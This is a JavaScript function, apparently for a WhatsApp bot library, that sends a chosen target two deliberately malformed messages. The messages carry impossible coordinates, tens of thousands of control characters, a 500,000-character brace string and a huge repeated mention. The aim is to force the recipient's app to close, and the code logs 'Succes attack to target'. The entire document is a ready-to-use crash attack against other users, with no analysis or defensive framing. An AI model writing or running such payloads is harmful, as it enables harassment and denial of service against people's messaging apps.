async function ForcecloseNew(sock, target) {
try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000),
              },
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "X",
              mentionedJid: ["0@s.whatsapp.net"],
            },
            body: {
              text: "PrivMess.js",
            },
            nativeFlowMessage: {
                    messageParamsJson: "{".repeat(500000),
            },
          },
        },
      },
    }, {
      participant: { jid: target },
      messageId: null,
    });   
        
    const msg2 = {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true", // Pastikan URL ini VALID
                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "Wkwk.pptx",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              contextInfo: {
                participant: target,
                remoteJid: "X",
                mentionedJid: ["6281393001103@s.whatsapp.net"],
              },
              body: {
                text: "@6281393001103".repeat(10000), // Teks yang jauh lebih pendek
              },
              nativeFlowMessage: {
                    messageParamsJson: "{}",
              },
            },
          },
        },
      },
    };
    await sock.relayMessage(target, msg2, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    console.log("Succes attack to target");
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
  }
}